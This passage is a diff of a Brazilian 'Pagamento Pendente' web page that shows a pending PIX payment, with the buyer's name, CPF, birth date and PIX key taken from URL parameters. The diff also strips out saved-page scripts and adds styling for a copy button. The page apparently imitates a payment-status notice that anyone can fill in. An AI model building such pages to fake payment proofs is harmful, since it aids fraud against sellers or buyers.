@@ -1,7 +1,7 @@
 <!DOCTYPE html>
-<!-- saved from url=(0029)https://cpvnt-tau.vercel.app/ -->
-<html lang="pt-br" coupert-item="9AF8D9A4E502F3784AD24272D81F0381"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    
+<html lang="pt-br">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pagamento Pendente</title>
     <style>
@@ -18,7 +18,7 @@
 
         .container {
             width: 277px;
-            height: 700px;
+            height: auto; /* Alterado para auto para acomodar novos elementos */
             padding: 0;
             background-color: #fff;
             overflow: hidden;
@@ -71,7 +71,6 @@
             color: #333;
             text-align: left;
             padding: 15px;
-         
             margin: 0 20px;
             border-radius: 4px;
             display: flex;
@@ -124,91 +123,32 @@
             margin: 5px 0px 10px 0px;
             font-weight: bold;
         }
+
+        /* Estilo para a nova mensagem e botão */
+        .message-container {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .message {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .copy-button {
+            padding: 10px 15px;
+            background-color: #1178d3;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .copy-button:hover {
+            background-color: #0f5b9e;
+        }
     </style>
-<script style="display: none;">var tvt = tvt || {}; tvt.captureVariables = function(a){for(var b=
-new Date,c={},d=Object.keys(a||{}),e,f={},g=0;e=d[g];f={Ka:f.Ka},g++)if(a.hasOwnProperty(e)&&"undefined"!=typeof a[e])try{f.Ka=[],c[e]=JSON.stringify(a[e],function(h){return function(k,l){try{if("function"!==typeof l){if("object"===typeof l&&null!==l){if(l instanceof HTMLElement||l instanceof Node||-1!=h.Ka.indexOf(l))return;h.Ka.push(l)}return l}}catch(t){}}}(f))}catch(h){}a=document.createEvent("CustomEvent");a.initCustomEvent("TvtRetrievedVariablesEvent",!0,!0,{variables:c,date:b});window.dispatchEvent(a)};window.setTimeout(function() {tvt.captureVariables({'dataLayer.hide': (function(a){a=a.split(".");for(var b=window,c=0;c<a.length&&(b=b[a[c]],b);c++);return b})('dataLayer.hide'),'gaData': window['gaData'],'dataLayer': window['dataLayer']})}, 2000);</script></head>
+</head>
 <body>
-<div class="container">
-    <div class="header"></div>
-    <div class="value-date-container">
-        <div class="value-date">
-            <label>Valor</label>
-            <p>R$ 49,90</p>
-        </div>
-        <div class="value-date" style="text-align: center;">
-            <label>Data</label>
-            <p style="margin: 1px 0px -4px 0px;"><span style="font-size: 16px;">18/10/2024</span><br><span style="font-size: 16px;">19:32:49</span></p>
-        </div>
-    </div>
-    <div class="status-alert">
-        <img src="erro.png" alt="Erro">
-        <div class="status-text">
-            <strong style="font-size: 16px; color: red;">PIX Pendente!</strong><br>
-            Aguardando Pagamento...
-        </div>
-    </div>
-    <div class="receiver-info">
-        <h2>Dados do Comprador:</h2>
-        <label>Nome</label>
-        <p id="nome"></p>
-        <label>Chave PIX</label>
-        <p id="pix"></p>
-    </div>
-</div>
-<script>
-    // Função para obter os parâmetros da URL
-    function getQueryParams() {
-        var params = {};
-        var parser = document.createElement('a');
-        parser.href = window.location.href;
-        var query = parser.search.substring(1);
-        var vars = query.split('&');
-        for (var i = 0; i < vars.length; i++) {
-            var pair = vars[i].split('=');
-            params[pair[0]] = decodeURIComponent(pair[1]);
-        }
-        return params;
-    }
-
-    // Função para atualizar a data e a hora
-    function updateDateTime() {
-        var now = new Date();
-        var options = {
-            day: '2-digit',
-            month: '2-digit',
-            year: 'numeric',
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit',
-            hour12: false,
-            timeZone: 'America/Sao_Paulo'
-        };
-        var dateTimeString = now.toLocaleString('pt-BR', options).replace(',', ''); // Remove a vírgula
-        var [date, time] = dateTimeString.split(' ');
-        document.querySelector('.value-date span:first-child').textContent = date.trim(); // Remove espaços em branco extras
-        document.querySelector('.value-date span:last-child').textContent = time;
-    }
-
-    // Configura os parâmetros da URL nos campos
-    window.onload = function () {
-        var queryParams = getQueryParams();
-        if (queryParams.nome) {
-            document.getElementById('nome').textContent = queryParams.nome;
-        }
-        if (queryParams.cpf) {
-            document.getElementById('cpf').textContent = queryParams.cpf;
-        }
-        if (queryParams.nasc) {
-            document.getElementById('nasc').textContent = queryParams.nasc;
-        }
-        if (queryParams.pix) {
-            document.getElementById('pix').textContent = queryParams.pix;
-        }
-        // Atualiza a data e a hora ao carregar a página
-        updateDateTime();
-    };
-</script>
-
-
-
-<div id="leadeasyModal" style="display:none;height:0px;width:0px;"><iframe id="headlineFetcher" style="width:0px;height:0px;" frameborder="0" scrolling="no" src="./Pagamento Pendente_files/index.html"></iframe></div><div id="leadeasyModalGoogleAlert"></div></body></html>
+<div class="
